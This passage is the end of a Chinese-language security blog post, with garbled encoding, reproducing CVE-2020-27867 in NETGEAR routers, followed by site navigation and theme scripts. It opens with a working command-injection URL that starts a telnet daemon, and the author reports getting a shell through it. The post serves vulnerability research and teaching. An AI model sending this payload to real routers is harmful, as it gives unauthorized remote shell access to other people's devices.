<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=|utelnetd%26<br></code></pre></td></tr></table></figure>
<p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ telnet è¿æ¥è·å–åˆ°ä¸€ä¸ª shell</p>
<p><img src="https://i.loli.net/2021/08/20/T6Su8JLI9fOadA5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/20/RYA3cqHGdZstXiC.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1>0xFF.Whatâ€™s moreâ€¦</h1>
<p>åœ¨åç»­å®˜æ–¹ç»™å‡ºçš„æ–°ç‰ˆæœ¬å›ºä»¶ä¸­è™½ç„¶ä¿®å¤äº†è¯¥æ¼æ´ï¼Œ<strong>ä½†æ˜¯æ²¡æœ‰å®Œå…¨ä¿®å¤ï¼Œä½¿å¾—å…¶æˆä¸ºäº†ç®€ä¸­ç‰¹ä¾›æ¼æ´</strong></p>
<blockquote>
<p>ä¸‹å›¾æ¥è‡ªå¾®åš <code>@blackorbird</code></p>
<blockquote>
<p>æ˜¯ä½ ğŸ¦„ @BlackBird</p>
</blockquote>
</blockquote>
<p><img src="https://i.loli.net/2021/08/20/SxIkKvolHE6Od1B.jpg" srcset="/img/loading.gif" lazyload alt="img.JPG"></p>
<blockquote>
<p>æ¼æ´ç»†èŠ‚æš‚æ—¶ä¸èƒ½è®²ï¼Œæ„Ÿå…´è¶£çš„ä¹Ÿä¸æ¨èç§ä¿¡æˆ‘hhhhhh</p>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/Pwn/">#Pwn</a>
      
        <a href="/tags/CVE/">#CVE</a>
      
        <a href="/tags/Netgear/">#Netgear</a>
      
        <a href="/tags/Remote-Code-Execute/">#Remote Code Execute</a>
      
        <a href="/tags/Command-Injection/">#Command Injection</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>ã€CVE.0x04ã€‘CVE-2020-27867 NETGEAR è·¯ç”±å™¨ RCE æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</div>
      <div>http://blog.arttnba3.cn/2021/08/17/CVE-0X04-CVE-2020-27867/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2021å¹´8æœˆ17æ—¥</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/" title="ã€PIECES.0x01ã€‘Shellä¹‹å¤–çš„å¾€äº‹ï¼šå¤å¤©çš„é£">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ã€PIECES.0x01ã€‘Shellä¹‹å¤–çš„å¾€äº‹ï¼šå¤å¤©çš„é£</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/08/10/CVE-0X03-CVE-2016-6909/" title="ã€CVE.0x03ã€‘CVE-2016-6909 Fortigate é˜²ç«å¢™ Cookie è§£ææ¼æ´å¤ç°åŠç®€è¦åˆ†æ">
                        <span class="hidden-mobile">ã€CVE.0x03ã€‘CVE-2016-6909 Fortigate é˜²ç«å¢™ Cookie è§£ææ¼æ´å¤ç°åŠç®€è¦åˆ†æ</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"è¯´ç‚¹ä»€ä¹ˆå‘—ï¼ˆç¬‘ï¼‰","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- ç½‘ç«™è¿è¡Œæ—¶é—´çš„è®¾ç½® -->
  <span id="timeDate">è½½å…¥å¤©æ•°...</span>
  <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//æ­¤å¤„ä¿®æ”¹ä½ çš„å»ºç«™æ—¶é—´æˆ–è€…ç½‘ç«™ä¸Šçº¿æ—¶é—´
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3çš„å°å±‹å·²ç»å®‰å…¨å­˜åœ¨äº† "+dnum+" å¤© ";
          document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="busuanzi_value_site_pv"></span>
         æ¬¡
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="busuanzi_value_site_uv"></span>
         äºº
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
